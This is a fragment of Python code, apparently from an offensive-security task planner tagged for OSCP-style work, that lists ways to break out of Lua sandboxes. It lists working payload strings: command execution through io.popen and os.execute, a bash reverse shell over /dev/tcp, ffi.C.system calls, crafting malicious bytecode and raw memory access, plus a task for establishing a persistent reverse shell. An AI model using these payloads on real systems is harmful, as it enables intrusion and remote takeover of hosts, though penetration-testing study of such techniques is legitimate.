                'id': f'lua-shell-establish-{port}',
                'name': 'Establish Reverse Shell',
                'type': 'manual',
                'metadata': {
                    'description': 'Command execution confirmed - establish persistent shell',
                    'tags': ['OSCP:LOW', 'EXPLOIT'],
                    'notes': 'Use io.popen with bash/powershell reverse shell payload'
                }
            })

        return new_tasks

    def get_manual_alternatives(self, task_id: str) -> List[str]:
        """Get manual alternatives for automated tasks"""

        if 'enum-globals' in task_id:
            return [
                'Manual: for k,v in pairs(_G) do print(k, type(v)) end',
                'Selective: print(io); print(os); print(load); print(debug)',
                'Output redirection: Capture to file if print() blocked',
                'Use game UI/chat as output channel'
            ]

        if 'io-os-test' in task_id:
            return [
                'Linux: io.popen("/bin/sh -c id")',
                'Windows: io.popen("cmd /c whoami")',
                'Alternative: os.execute("command")',
                'Reverse shell: io.popen("bash -i >& /dev/tcp/IP/PORT 0>&1")'
            ]

        if 'bytecode' in task_id:
            return [
                'Study Lua VM internals with IDA/Ghidra',
                'Use luac -l to disassemble bytecode',
                'Craft malicious bytecode manually',
                'Test with local Lua installation first'
            ]

        if 'ffi' in task_id:
            return [
                'Test: ffi = require("ffi")',
                'Simple: ffi.C.system("calc.exe")',
                'Advanced: ffi.cdef + custom function calls',
                'Memory access: ffi.cast("uint8_t*", address)'
            ]

        return []
